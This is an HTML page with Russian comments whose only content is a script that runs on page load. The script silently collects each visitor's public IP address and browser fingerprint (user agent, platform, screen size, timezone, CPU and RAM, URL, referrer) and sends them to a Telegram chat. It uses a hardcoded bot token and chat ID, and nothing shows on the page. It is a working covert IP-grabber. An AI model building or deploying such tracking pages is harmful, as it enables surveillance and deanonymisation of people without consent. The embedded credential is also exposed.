<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>World</title>
</head>
<body>


    <script>
        // НАСТРОЙКИ (Вставьте свои данные)
        const TG_BOT_TOKEN = '8553763444:AAEgN6vvsEnyeVzcQD1dmT4D6k3t82Ovlu0'; // Например: 123456:ABC-DEF...
        const TG_CHAT_ID = '2077622620';      // Например: 123456789

        async function collectAndSend() {
            const statusText = document.getElementById('status');
            
            try {
                // 1. Сбор данных об IP (через сторонний сервис)
                let ipData = {};
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    ipData = await ipResponse.json();
                } catch (e) {
                    ipData = { ip: 'Не удалось определить' };
                }

                // 2. Сбор данных из браузера
                const analytics = {
                    ip: ipData.ip,
                    userAgent: navigator.userAgent, // Браузер и ОС
                    language: navigator.language, // Язык
                    platform: navigator.platform, // Платформа (Win32, MacIntel и т.д.)
                    screen: `${window.screen.width}x${window.screen.height}`, // Разрешение экрана
                    windowSize: `${window.innerWidth}x${window.innerHeight}`, // Размер окна
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Часовой пояс
                    cores: navigator.hardwareConcurrency || 'unknown', // Кол-во ядер CPU
                    ram: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'unknown', // ОЗУ (примерно)
                    cookiesEnabled: navigator.cookieEnabled, // Включены ли куки
                    url: window.location.href, // Адрес страницы
                    referrer: document.referrer // Откуда перешел
                };

                // 3. Формирование сообщения для Telegram
                const message = `
<b>🔔 Новый посетитель!</b>
--------------------------
<b>IP:</b> <code>${analytics.ip}</code>
<b>Платформа:</b> ${analytics.platform}
<b>ОС/Браузер:</b> ${analytics.userAgent}
<b>Экран:</b> ${analytics.screen}
<b>Язык:</b> ${analytics.language}
<b>Timezone:</b> ${analytics.timezone}
<b>CPU/RAM:</b> ${analytics.cores} cores / ${analytics.ram}
<b>URL:</b> ${analytics.url}
                `;

                // 4. Отправка в Telegram
                const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TG_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (response.ok) {
                    statusText.innerText = "";
                    console.log("Отправлено в TG");
                } else {
                    statusText.innerText = "";
                    console.error("Ошибка TG:", await response.text());
                }

            } catch (error) {
                console.error("Общая ошибка:", error);
                statusText.innerText = "Произошла ошибка.";
            }
        }

        // Запуск функции при загрузке страницы
        document.addEventListener("DOMContentLoaded", collectAndSend);
    </script>
</body>
</html>
